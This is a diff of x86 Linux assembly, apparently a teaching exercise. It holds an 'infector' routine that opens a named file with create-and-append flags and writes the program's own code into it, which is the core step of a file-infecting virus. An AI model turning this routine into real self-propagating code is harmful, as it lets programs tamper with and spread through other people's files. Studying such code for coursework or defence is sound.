@@ -54,56 +54,56 @@ infection:
     mov     ebp, esp
     pushad                  ; Save some more caller state
     
-    mov eax, [ebp+8]        ; move the argument to acc
+    mov eax, [ebp+8]
+    mov ebp, eax
     and eax, 1              ; isOdd
-    jnz odd                 ; is nonZero
-
+    jnz exit                 ; is nonZero
+    jmp even
+    
+    
+even:
     mov eax, 4              ; move syscall write opcode to eax- arg 1
     mov ebx, 1              ; move stdout fd to ebx - arg 2
     mov ecx, msg            ; move msg to ecx - arg 3
     mov edx, 22             ; move the length of msg to edx- arg4
+    int     0x80           ; Transfer control to operating system
+    sub ebp, 1
+    jnz even
 
-    int     0x80            ; Transfer control to operating system
-
-    popad                   ; Restore caller state (registers)
-    mov esp, ebp
-    pop     ebp             ; Restore caller state
-    ret                     ; Back to caller
-
-odd:                        ; do nothing
+exit:                        ; do nothing
     popad                   ; Restore caller state (registers)
     mov esp, ebp
     pop     ebp             ; Restore caller state
     ret  
 
 infector:
-    push    ebp             ; Save caller state
+    push    ebp             
     mov     ebp, esp
-    sub     esp, 4          ; Leave space for fd on stack
-    pushad                  ; Save some more caller state
+    sub     esp, 4          
+    pushad                  
 
-    mov eax, 5              ; system call number (sys_open) 
-    mov ebx, dword [ebp+8]  ; file name
-    mov ecx, 0x441               ; save fd in the reserved space (in order to close the file later)
-    mov edx, 0777           ; 0x01 (O_WRONLY) OR 0x400 (O_APPEND)
-    int 0x80                ; call kernel
+    mov eax, 5              
+    mov ebx, dword [ebp+8]  
+    mov ecx, 0x441               
+    mov edx, 0777           
+    int 0x80                
 
     mov ebx, eax            
-    mov [ebp-4], eax        ; save fd in the reserved space (in order to close the file later)
+    mov [ebp-4], eax        
     mov eax, 4
-    mov ecx, code_start     ; pointer to the start of the buffer
+    mov ecx, code_start     
     mov edx, code_end
-    sub edx, code_start     ; compute the length of the buffer
-    int 0x80                ; call kernel
+    sub edx, code_start     
+    int 0x80                
 
-    mov eax, 6              ; system call number (sys_close)
-    mov ebx, dword[ebp-4]   ; the fd of the file that should close
-    int 0x80                ; call kernel
+    mov eax, 6              
+    mov ebx, dword[ebp-4]   
+    int 0x80                
 
-    popad                   ; Restore caller state (registers)
+    popad                   
     mov esp, ebp
-    pop     ebp             ; Restore caller state
-    ret                     ; Back to caller
+    pop     ebp             
+    ret                     
 
 code_end:
 
